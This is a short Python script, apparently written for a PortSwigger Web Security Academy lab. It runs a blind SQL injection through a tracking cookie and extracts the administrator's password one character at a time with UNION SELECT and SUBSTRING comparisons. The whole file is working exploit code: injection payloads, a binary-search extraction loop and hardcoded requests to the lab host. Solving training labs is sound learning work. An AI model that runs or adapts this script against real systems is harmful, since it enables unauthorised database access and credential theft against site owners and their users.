#!/usr/bin/python3

import requests, urllib, string

url = 'https://acbf1fbd1feb62f080d1123b00f900bf.web-security-academy.net/filter?category=Tech+gifts'

def getrequest(url,payload):
    return len(requests.get(url, headers = {'Cookie': 'TrackingId=xyz'+payload}).content)

def buildPayload(arr, low, high,i):

    payload0 = "' UNION SELECT 'a' from Users where username = 'administrator' --"
    payload = "' UNION SELECT 'a' FROM Users where Username = 'administrator' AND SUBSTRING(password,"+str(i)+",1)"
    if high >= low:
        mid = (low + high) // 2
        print("MID: " + arr[mid])
        if (getrequest(url,payload + "=" + "'"+arr[mid]+"' --") == getrequest(url,payload0)):
            return arr[mid] 
        elif (getrequest(url,payload + "<" + "'"+arr[mid]+"' --") == getrequest(url,payload0)):
            return buildPayload(arr, low, mid-1, i)
        else : 
            return buildPayload(arr, mid +1 ,high,i)
    else :
        return str(-1)
    
def blindinjection():

    password = ""
    arr = buildArray()
    print(arr)
    for i in range(1,21):
        password += buildPayload(arr,0,len(arr)-1,i)
    return password

    ## Discovering password length
    payloadlength = "'UNION SELECT 'a' FROM Users where Username = 'administrator' and LENGTH(password) = 20 --"

def buildArray():
    return list(string.digits)  + list(string.ascii_lowercase) 
    
def main():
    
    print(blindinjection())

if __name__ == '__main__':
    main()